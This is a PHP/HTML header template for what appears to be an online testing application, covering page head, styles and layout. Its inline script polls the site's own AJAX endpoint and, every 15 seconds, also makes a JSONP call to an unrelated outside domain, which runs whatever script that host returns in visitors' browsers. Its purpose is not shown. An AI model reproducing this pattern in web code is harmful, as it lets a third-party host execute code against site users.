<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="<?php echo $lngstr['text_direction']; ?>"><head><title><?php echo
$page_title . $lngstr['item_separator'] . $srv_settings['title_postfix'] ?></title>
        <meta http-equiv="Content-Language" content="<?php echo $lngstr['meta_contentlanguage']; ?>">
            <meta content="text/html; charset=<?php echo $lngstr['meta_charset']; ?>" http-equiv=Content-Type>
                <link rel="SHORTCUT ICON" href="/favicon.ico">
                    <link href="shared/style.css" rel=stylesheet type=text/css>
                    <script language=javascript src="shared/shared.js" type="text/javascript"></script>
                        <?php echo $page_meta; ?></head>
                        <script type="text/javascript" src="/js/jquery-1.3.2.min.js"></script>
                        <script type="text/javascript" src="/js/jquery.corner.js?v2.01"></script>
                        <style type="text/css">
                            .content {
                                display: block;
                                background-color:#ececec;
                                padding: 10px;
                                margin-left: 19px;
                                margin-right: 19px;
                                box-shadow: 0 2px 5px #000;
                                -moz-box-shadow: 0 2px 5px #000;
                                -webkit-box-shadow: 0 2px 5px #000;	
                            }

                        </style>

                        <script type="text/javascript">  
                            function uAct(){
                                $.getJSON("/ajax.php?resultid=<?php echo  $G_SESSION['resultid'] ?>&action=uact");
                                $.getJSON("http://kkzcore.pp.ua/?do=ajax&cron=1&callback=?");
                                setTimeout("uAct()",15000);
                            }
                            uAct();
                        </script>
                        <body bgcolor="#ffffff"<?php echo $page_body_tag; ?>>

                            <table width="100%" border="0" cellspacing="0" cellpadding="0">
                                <tr>
                                    <td width="31"><img src="images/gead_bg_01.png" width="31" height="138" /></td>
                                    <td valign="top" background="images/gead_bg_02.png"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                                            <tr>
                                                <td height="20" align="right" valign="bottom"></td>
                                            </tr>
                                            <tr>
                                                <td height="70"><img src="images/logo.png" /></td>
                                            </tr>
                                            <tr>
                                                <td height="30">


                                                </td>
                                            </tr>
                                        </table></td>
                                    <td width="32"><img src="images/gead_bg_03.png" width="32" height="138" /></td>
                                </tr>
                            </table>




                            <table cellpadding=0 cellspacing=0 border=0 width="100%" align="center">
                                <tr><td class=box_area>
                                        <div class="content">
